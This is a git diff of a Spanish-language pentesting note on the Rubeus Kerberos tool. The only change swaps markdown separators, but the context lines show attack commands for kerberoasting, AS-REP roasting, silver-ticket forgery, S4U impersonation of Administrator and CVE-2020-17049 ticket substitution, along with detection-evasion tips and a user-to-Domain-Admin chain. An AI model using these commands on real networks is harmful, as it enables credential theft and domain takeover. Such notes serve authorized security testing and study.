@@ -27,7 +27,7 @@ linked:
 ---
 # Rubeus
 
-***
+---
 
 ## Overview
 
@@ -37,7 +37,7 @@ Compilar: VS2019+ con .NET 3.5/4.x targets / repo GhostPack. Binarios precompila
 
 > Regla: Rubeus corre in-memory con privilegios del user actual. Para operaciones SYSTEM (`dump`, `harvest`, `monitor`): necesita elevación o `ptt` con ticket SYSTEM.
 
-***
+---
 
 ## Sintaxis base
 
@@ -50,7 +50,7 @@ Rubeus.exe <command> /user:USER /aes256:<aes256> /domain:DOMAIN
 
 Encoding tickets: Rubeus trabaja con **kirbi (base64)**. Para ccache: convertir con `impacket-ticketConverter` o `Rubeus ptt` + `klist export`.
 
-***
+---
 
 ## Kerberoasting
 
@@ -75,7 +75,7 @@ Rubeus.exe kerberoast /tgtdeleg                     # reutiliza TGT propio
 
 Ver [[Kerberoasting]] para hashcat side.
 
-***
+---
 
 ## AS-REP Roasting
 
@@ -87,7 +87,7 @@ Rubeus.exe asreproast /nopreauth:alice                 # para user específico s
 
 Ver [[AS-REP Roasting]].
 
-***
+---
 
 ## Ticket management
 
@@ -143,7 +143,7 @@ Rubeus.exe klist /luid:0xDEADBEEF           # otra sesión (SYSTEM)
 
 Ver [[Pass-the-Ticket]].
 
-***
+---
 
 ## Golden / Silver Ticket
 
@@ -175,7 +175,7 @@ Rubeus.exe silver /user:Administrator /domain:domain.local /sid:S-1-5-21-... \
 
 Ver [[Silver Ticket]].
 
-***
+---
 
 ## Harvest / dump / monitor (credential access activo)
 
@@ -217,7 +217,7 @@ Rubeus.exe tgtdeleg /target:dc01.domain.local
 
 Excepto si `Protected Users` o `NOT_DELEGATED` flag.
 
-***
+---
 
 ## S4U (Kerberos delegation abuse)
 
@@ -246,7 +246,7 @@ Rubeus.exe s4u /user:alice /rc4:<NT> /impersonateuser:Administrator \
 
 `/altservice` agrega SPNs adicionales al TGS (Kerberos trick — `sname` no valida vs SPN real).
 
-***
+---
 
 ## Shadow Credentials + Kerberos cert auth (PKINIT)
 
@@ -260,7 +260,7 @@ Rubeus.exe asktgt /user:victim /certificate:victim.pfx /password:<pfxpass> \
 
 El `/getcredentials` devuelve NThash del user (vía U2U + PAC extraction).
 
-***
+---
 
 ## createnetonly
 
@@ -274,7 +274,7 @@ Rubeus.exe ptt /ticket:<b64>
 
 Útil para correr herramientas con creds AD sin cambiar user del host.
 
-***
+---
 
 ## changepw
 
@@ -284,7 +284,7 @@ Cambiar password de una cuenta vía Kerberos (MS-SAMR alternative, útil si SMB 
 Rubeus.exe changepw /ticket:alice.kirbi /new:NewPassword123!
 ```
 
-***
+---
 
 ## tgssub (TGS field substitution — CVE-2020-17049)
 
@@ -294,7 +294,7 @@ Rubeus.exe tgssub /ticket:<b64> /altservice:cifs/victim.domain.local /ptt
 
 Historical bypass en non-fully-patched DCs.
 
-***
+---
 
 ## hash (hash computation offline)
 
@@ -305,7 +305,7 @@ Rubeus.exe hash /password:Passw0rd /user:alice /domain:domain.local
 
 Útil para convertir password → AES256 sin pegarse a DC.
 
-***
+---
 
 ## Opsec tips
 
@@ -316,7 +316,7 @@ Rubeus.exe hash /password:Passw0rd /user:alice /domain:domain.local
 - Evitar cmdline largo: usar `Invoke-Binary` con args encoded, o file-based input (`/ticketfile:`).
 - Loggear con `klist` para confirmar ticket loaded antes de ejecutar acción.
 
-***
+---
 
 ## Chain típico: user low → DA
 
@@ -328,7 +328,7 @@ Rubeus.exe hash /password:Passw0rd /user:alice /domain:domain.local
 5. dir \\dc01\C$
 ```
 
-***
+---
 
 ## Referencias
 
